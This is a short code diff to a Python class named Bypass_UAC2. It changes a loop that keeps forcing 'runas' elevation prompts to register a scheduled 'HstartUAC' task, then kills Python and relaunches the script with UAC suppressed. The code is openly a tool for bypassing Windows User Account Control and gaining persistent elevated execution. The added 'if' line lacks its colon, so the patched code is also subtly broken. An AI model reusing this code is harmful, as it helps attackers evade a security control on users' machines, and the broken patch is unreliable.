@@ -22,11 +22,11 @@ class Bypass_UAC2():
 		python = os.path.abspath(sys.executable)
 		me = os.path.abspath(sys.argv[0])
 
-		while True:
-			try:
-				shell.ShellExecuteEx(lpVerb='runas', lpFile="cmd.exe", lpParameters="/c " + filename + " /regtask")
-				sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.note], shell=True)
-				os.system("taskkill /IM python.exe /F")
-
-			except Exception as ex:
-				pass
+		if "HstartUAC" not in os.popen('schtasks.exe | findstr HstartUAC').read()
+			while True:
+				try:
+					shell.ShellExecuteEx(lpVerb='runas', lpFile="cmd.exe", lpParameters="/c " + filename + " /regtask")
+				except Exception as ex:
+					pass
+		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.note], shell=True)
+		os.system("taskkill /IM python.exe /F")
